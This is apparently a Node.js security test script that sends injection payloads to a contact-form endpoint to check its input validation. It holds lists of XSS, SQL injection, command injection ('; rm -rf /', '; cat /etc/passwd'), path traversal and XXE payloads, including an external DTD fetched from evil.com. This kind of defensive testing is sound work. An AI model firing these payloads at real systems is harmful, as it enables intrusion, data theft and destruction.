#!/usr/bin/env node

/**
 * Input Validation Security Testing Script
 * Tests XSS, SQL injection, command injection, and other input validation vulnerabilities
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');

class InputValidationTestSuite {
  constructor(baseUrl = 'http://localhost:5000') {
    this.baseUrl = baseUrl;
    this.results = {
      passed: 0,
      failed: 0,
      tests: []
    };
    this.cookies = {};
    this.csrfToken = null;
  }

  async runAllTests() {
    console.log('🛡️ Starting Input Validation Security Tests...\n');

    try {
      // Get CSRF token first
      await this.getCSRFToken();

      await this.testXSSPrevention();
      await this.testSQLInjectionPrevention();
      await this.testCommandInjectionPrevention();
      await this.testPathTraversalPrevention();
      await this.testHTMLInjectionPrevention();
      await this.testJavaScriptInjectionPrevention();
      await this.testLDAPInjectionPrevention();
      await this.testXMLInjectionPrevention();

      this.generateReport();
      return this.results.failed === 0;
    } catch (error) {
      console.error('❌ Input validation test suite failed:', error.message);
      return false;
    }
  }

  async getCSRFToken() {
    try {
      const response = await this.makeRequest('GET', '/api/csrf-token');
      if (response.statusCode === 200) {
        const data = JSON.parse(response.body);
        this.csrfToken = data.csrfToken;
      }
    } catch (error) {
      console.log('⚠️ Could not obtain CSRF token, some tests may fail');
    }
  }

  async testXSSPrevention() {
    const testName = 'XSS Prevention';
    console.log(`🧪 ${testName}...`);

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '"><script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
    ];

    let vulnerabilities = 0;

    for (const payload of xssPayloads) {
      try {
        const formData = JSON.stringify({
          name: payload,
          email: 'test@example.com',
          message: payload
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // Check if the payload is reflected in the response without escaping
        if (response.body && response.body.includes(payload) &&
            (response.body.includes('<script>') || response.body.includes('onerror='))) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential XSS vulnerability with payload: ${payload.substring(0, 50)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No XSS vulnerabilities detected');
      console.log('   ✅ XSS protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential XSS vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential XSS vulnerabilities detected`);
    }
  }

  async testSQLInjectionPrevention() {
    const testName = 'SQL Injection Prevention';
    console.log(`🧪 ${testName}...`);

    const sqlPayloads = [
      "' OR '1'='1",
      "' UNION SELECT * FROM users--",
      "'; DROP TABLE users; --",
      "' OR 1=1 --",
      "admin'--",
      "' OR 'x'='x",
      "1' AND 1=1 --",
      "1' AND 1=2 --",
      "' UNION SELECT null,username,password FROM users --",
      "' OR (SELECT COUNT(*) FROM users) > 0 --"
    ];

    let vulnerabilities = 0;

    for (const payload of sqlPayloads) {
      try {
        const formData = JSON.stringify({
          name: payload,
          email: 'test@example.com',
          message: 'SQL injection test'
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // Check for SQL error messages in response
        const sqlErrors = [
          'sql syntax',
          'mysql_fetch',
          'ora-01756',
          'microsoft jet database',
          'odbc microsoft access',
          'sqlite_master',
          'postgresql'
        ];

        const responseBody = response.body.toLowerCase();
        if (sqlErrors.some(error => responseBody.includes(error))) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential SQL injection vulnerability with payload: ${payload.substring(0, 30)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No SQL injection vulnerabilities detected');
      console.log('   ✅ SQL injection protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential SQL injection vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential SQL injection vulnerabilities detected`);
    }
  }

  async testCommandInjectionPrevention() {
    const testName = 'Command Injection Prevention';
    console.log(`🧪 ${testName}...`);

    const commandPayloads = [
      '; ls -la',
      '&& dir',
      '| whoami',
      '; cat /etc/passwd',
      '`ping google.com`',
      '$(whoami)',
      '; rm -rf /',
      '&& type con',
      '| type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts',
      '; ps aux'
    ];

    let vulnerabilities = 0;

    for (const payload of commandPayloads) {
      try {
        const formData = JSON.stringify({
          name: `test${payload}`,
          email: 'test@example.com',
          message: `Command injection test ${payload}`
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // Check for command execution indicators
        const commandIndicators = [
          'root:x:0:0',
          'total ',
          'volume serial number',
          'ping statistics',
          'uid=',
          'gid='
        ];

        const responseBody = response.body.toLowerCase();
        if (commandIndicators.some(indicator => responseBody.includes(indicator))) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential command injection vulnerability with payload: ${payload.substring(0, 20)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No command injection vulnerabilities detected');
      console.log('   ✅ Command injection protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential command injection vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential command injection vulnerabilities detected`);
    }
  }

  async testPathTraversalPrevention() {
    const testName = 'Path Traversal Prevention';
    console.log(`🧪 ${testName}...`);

    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ];

    let vulnerabilities = 0;

    for (const payload of pathPayloads) {
      try {
        // Test in name field
        const formData = JSON.stringify({
          name: payload,
          email: 'test@example.com',
          message: 'Path traversal test'
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // Check for file content indicators
        const fileIndicators = [
          'root:x:0:0',
          '# copyright',
          'localhost',
          '127.0.0.1'
        ];

        const responseBody = response.body.toLowerCase();
        if (fileIndicators.some(indicator => responseBody.includes(indicator))) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential path traversal vulnerability with payload: ${payload.substring(0, 30)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No path traversal vulnerabilities detected');
      console.log('   ✅ Path traversal protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential path traversal vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential path traversal vulnerabilities detected`);
    }
  }

  async testHTMLInjectionPrevention() {
    const testName = 'HTML Injection Prevention';
    console.log(`🧪 ${testName}...`);

    const htmlPayloads = [
      '<h1>Injected HTML</h1>',
      '<style>body{background:red}</style>',
      '<form><input type="password"></form>',
      '<iframe src="http://evil.com"></iframe>',
      '<meta http-equiv="refresh" content="0;url=http://evil.com">',
      '<base href="http://evil.com">'
    ];

    let vulnerabilities = 0;

    for (const payload of htmlPayloads) {
      try {
        const formData = JSON.stringify({
          name: 'Test User',
          email: 'test@example.com',
          message: payload
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // Check if HTML tags are not escaped
        if (response.body && response.body.includes(payload)) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential HTML injection vulnerability with payload: ${payload.substring(0, 30)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No HTML injection vulnerabilities detected');
      console.log('   ✅ HTML injection protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential HTML injection vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential HTML injection vulnerabilities detected`);
    }
  }

  async testJavaScriptInjectionPrevention() {
    const testName = 'JavaScript Injection Prevention';
    console.log(`🧪 ${testName}...`);

    const jsPayloads = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("XSS")',
      'onload=alert(1)',
      'onerror=alert(1)',
      'onclick=alert(1)'
    ];

    let vulnerabilities = 0;

    for (const payload of jsPayloads) {
      try {
        const formData = JSON.stringify({
          name: payload,
          email: 'test@example.com',
          message: 'JavaScript injection test'
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // Check if JavaScript is not escaped
        if (response.body && response.body.includes(payload)) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential JavaScript injection vulnerability with payload: ${payload.substring(0, 30)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No JavaScript injection vulnerabilities detected');
      console.log('   ✅ JavaScript injection protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential JavaScript injection vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential JavaScript injection vulnerabilities detected`);
    }
  }

  async testLDAPInjectionPrevention() {
    const testName = 'LDAP Injection Prevention';
    console.log(`🧪 ${testName}...`);

    const ldapPayloads = [
      '*)(uid=*))(|(uid=*',
      '*)(|(password=*))',
      '*))%00',
      '*)(&(password=*))',
      '*)(|(objectClass=*))'
    ];

    let vulnerabilities = 0;

    for (const payload of ldapPayloads) {
      try {
        const formData = JSON.stringify({
          name: payload,
          email: 'test@example.com',
          message: 'LDAP injection test'
        });

        const response = await this.makeRequest('POST', '/api/forms/contact', formData, {
          'Content-Type': 'application/json',
          'X-CSRF-Token': this.csrfToken
        });

        // LDAP injection detection is complex, so we just check for unescaped characters
        if (response.body && response.body.includes(payload)) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential LDAP injection vulnerability with payload: ${payload.substring(0, 20)}...`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No LDAP injection vulnerabilities detected');
      console.log('   ✅ LDAP injection protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential LDAP injection vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential LDAP injection vulnerabilities detected`);
    }
  }

  async testXMLInjectionPrevention() {
    const testName = 'XML/XXE Injection Prevention';
    console.log(`🧪 ${testName}...`);

    const xmlPayloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % evil SYSTEM "http://evil.com/evil.dtd">%evil;]>',
      '<![CDATA[<script>alert(1)</script>]]>'
    ];

    let vulnerabilities = 0;

    for (const payload of xmlPayloads) {
      try {
        const response = await this.makeRequest('POST', '/api/forms/contact', payload, {
          'Content-Type': 'application/xml',
          'X-CSRF-Token': this.csrfToken
        });

        // Check for XXE indicators
        const xxeIndicators = [
          'root:x:0:0',
          'entity',
          'doctype'
        ];

        const responseBody = response.body.toLowerCase();
        if (xxeIndicators.some(indicator => responseBody.includes(indicator))) {
          vulnerabilities++;
          console.log(`   ⚠️ Potential XXE vulnerability detected`);
        }
      } catch (error) {
        // Network errors are not security issues
      }
    }

    if (vulnerabilities === 0) {
      this.recordTest(testName, true, 'No XML injection vulnerabilities detected');
      console.log('   ✅ XML injection protection working correctly');
    } else {
      this.recordTest(testName, false, `${vulnerabilities} potential XML injection vulnerabilities found`);
      console.log(`   ❌ ${vulnerabilities} potential XML injection vulnerabilities detected`);
    }
  }

  makeRequest(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
      const url = new URL(this.baseUrl + path);
      const options = {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        method: method,
        headers: {
          'User-Agent': 'InputValidation-Security-Test/1.0',
          ...headers
        }
      };

      if (data) {
        options.headers['Content-Length'] = Buffer.byteLength(data);
      }

      // Add cookies if we have them
      if (Object.keys(this.cookies).length > 0) {
        options.headers['Cookie'] = Object.entries(this.cookies)
          .map(([key, value]) => `${key}=${value}`)
          .join('; ');
      }

      const protocol = url.protocol === 'https:' ? https : http;
      const req = protocol.request(options, (res) => {
        let body = '';

        // Handle cookies from response
        const setCookie = res.headers['set-cookie'];
        if (setCookie) {
          setCookie.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, value] = nameValue.split('=');
            this.cookies[name.trim()] = value.trim();
          });
        }

        res.on('data', (chunk) => {
          body += chunk;
        });

        res.on('end', () => {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: body
          });
        });
      });

      req.on('error', (error) => {
        reject(error);
      });

      if (data) {
        req.write(data);
      }

      req.end();
    });
  }

  recordTest(name, passed, details) {
    this.results.tests.push({
      name,
      passed,
      details,
      timestamp: new Date().toISOString()
    });

    if (passed) {
      this.results.passed++;
    } else {
      this.results.failed++;
    }
  }

  generateReport() {
    const report = {
      testSuite: 'Input Validation Security Tests',
      timestamp: new Date().toISOString(),
      summary: {
        total: this.results.passed + this.results.failed,
        passed: this.results.passed,
        failed: this.results.failed,
        successRate: ((this.results.passed / (this.results.passed + this.results.failed)) * 100).toFixed(1)
      },
      tests: this.results.tests
    };

    // Save report
    const reportDir = path.join(__dirname, '..', 'security-reports');
    if (!fs.existsSync(reportDir)) {
      fs.mkdirSync(reportDir, { recursive: true });
    }

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const reportPath = path.join(reportDir, `input-validation-${timestamp}.json`);
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));

    console.log(`\n📊 Input Validation Test Summary:`);
    console.log(`   Total Tests: ${report.summary.total}`);
    console.log(`   Passed: ${report.summary.passed}`);
    console.log(`   Failed: ${report.summary.failed}`);
    console.log(`   Success Rate: ${report.summary.successRate}%`);
    console.log(`   Report saved: ${reportPath}\n`);
  }
}

// Run tests if executed directly
if (require.main === module) {
  const testSuite = new InputValidationTestSuite(process.argv[2]);

  testSuite.runAllTests().then(success => {
    process.exit(success ? 0 : 1);
  }).catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
}

module.exports = InputValidationTestSuite;